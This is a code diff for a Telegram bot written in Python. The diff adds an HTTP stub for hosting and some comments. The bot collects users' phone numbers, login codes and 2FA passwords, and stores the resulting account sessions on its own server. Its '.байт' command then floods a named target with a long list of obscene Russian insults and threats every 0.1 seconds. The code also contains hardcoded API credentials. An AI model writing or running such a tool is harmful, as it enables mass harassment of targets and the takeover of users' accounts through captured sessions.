@@ -1,10 +1,13 @@
 import asyncio
 import os
 import re
+from threading import Thread
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from telethon import TelegramClient, events
 from telethon.errors import FloodWaitError, SessionPasswordNeededError
 from telethon.tl.custom import Button
 
+# ========== КОНФИГ ==========
 API_ID = 39163151
 API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
 BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
@@ -13,18 +16,38 @@ SESSION_DIR = "sessions"
 if not os.path.exists(SESSION_DIR):
     os.makedirs(SESSION_DIR)
 
-user_states = {}
-user_temp = {}
-user_clients = {}
+# ========== ЗАГЛУШКА ДЛЯ RENDER (HTTP-СЕРВЕР) ==========
+class SimpleHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Bot is running!')
+    
+    def log_message(self, format, *args):
+        pass  # отключаем логи HTTP-сервера
 
+def run_webserver():
+    port = int(os.environ.get('PORT', 10000))
+    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
+    server.serve_forever()
+
+Thread(target=run_webserver, daemon=True).start()
+# ======================================================
+
+# ========== КЛИЕНТ ТЕЛЕГРАМ ==========
 bot_client = TelegramClient(
     os.path.join(SESSION_DIR, 'bot_session'),
     API_ID,
     API_HASH
 ).start(bot_token=BOT_TOKEN)
 
+# ========== ХРАНИЛИЩА ==========
+user_states = {}
+user_temp = {}
+user_clients = {}
 active_attacks = {}
 
+# ========== ТЕКСТ ДЛЯ АТАКИ ==========
 lines_list = [
 "я твою мать ебал", "я твою мать ебал в жопу", "я твою мать ебал в рот",
 "я твою мать ебал в глотку", "я твою мать ебал в пизду", "я твою мать ебал в анал",
@@ -91,6 +114,7 @@ lines_list = [
 "и никто не придет", "никто не всплакнет", "никто не вспомнит", "потому что ты никто и звать тебя никак"
 ]
 
+# ========== ФУНКЦИИ АВТОРИЗАЦИИ ==========
 async def create_user_client(user_id):
     session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
     return TelegramClient(session_path, API_ID, API_HASH)
@@ -99,12 +123,14 @@ async def send_code(client, phone):
     await client.connect()
     return await client.send_code_request(phone)
 
+# ========== ОБРАБОТЧИК КОМАНД ==========
 @bot_client.on(events.NewMessage)
 async def handler(event):
     user_id = event.sender_id
     text = event.raw_text.strip()
     chat_id = event.chat_id
 
+    # /start
     if text == '/start':
         buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
         await event.reply(
@@ -113,12 +139,13 @@ async def handler(event):
         )
         return
 
+    # Обработка контакта с номером
     if event.contact:
         phone = event.contact.phone_number
         if not phone:
             await event.reply("❌ Не удалось получить номер")
             return
-
+        
         client = await create_user_client(user_id)
         try:
             result = await send_code(client, phone)
@@ -135,6 +162,7 @@ async def handler(event):
             await event.reply(f"❌ Ошибка: {e}")
         return
 
+    # Обработка ввода кода
     if user_id in user_states and user_states[user_id] == 'awaiting_code':
         code = text.strip()
         temp = user_temp.get(user_id)
@@ -142,7 +170,7 @@ async def handler(event):
             await event.reply("❌ Ошибка, попробуй /start заново")
             del user_states[user_id]
             return
-
+        
         try:
             await temp['client'].sign_in(
                 phone=temp['phone'],
@@ -163,6 +191,7 @@ async def handler(event):
             del user_states[user_id]
         return
 
+    # Обработка 2FA пароля
     if user_id in user_states and user_states[user_id] == 'awaiting_password':
         password = text.strip()
         temp = user_temp.get(user_id)
@@ -170,7 +199,7 @@ async def handler(event):
             await event.reply("❌ Ошибка, попробуй /start заново")
             del user_states[user_id]
             return
-
+        
         try:
             await temp['client'].sign_in(password=password)
             user_clients[user_id] = temp['client']
@@ -181,25 +210,26 @@ async def handler(event):
             await event.reply(f"❌ Ошибка: {e}")
         return
 
+    # Команда .байт
     if text.startswith('.байт '):
         if user_id not in user_clients:
             await event.reply("❌ Сначала авторизуйся: /start")
             return
-
+        
         parts = text.split()
         if len(parts) < 2:
             await event.reply("❌ .байт @username")
             return
-
+        
         target = parts[1].replace('@', '')
         key = f"{user_id}_{target}"
-
+        
         if key in active_attacks:
             await event.delete()
             return
-
+        
         stop_event = asyncio.Event()
-
+        
         async def attack_loop():
             client = user_clients[user_id]
             while not stop_event.is_set():
@@ -215,33 +245,35 @@ async def handler(event):
                     except:
                         pass
                 await asyncio.sleep(0.1)
-
+        
         task = asyncio.create_task(attack_loop())
         active_attacks[key] = {'task': task, 'stop': stop_event}
         await event.delete()
         return
-
+    
+    # Команда .байтстоп
     if text.startswith('.байтстоп '):
         parts = text.split()
         if len(parts) < 2:
             await event.reply("❌ .байтстоп @username")
             return
-
+        
         target = parts[1].replace('@', '')
         key = f"{user_id}_{target}"
-
+        
         if key in active_attacks:
             active_attacks[key]['stop'].set()
             active_attacks[key]['task'].cancel()
             del active_attacks[key]
-
+        
         await event.delete()
         return
 
+# ========== ЗАПУСК ==========
 async def main():
     await bot_client.start()
     me = await bot_client.get_me()
-    print(f'✅ Бот: @{me.username}')
+    print(f'✅ Бот запущен: @{me.username}')
     print(f'📁 Сессии сохраняются в папку: {SESSION_DIR}')
     await bot_client.run_until_disconnected()
 
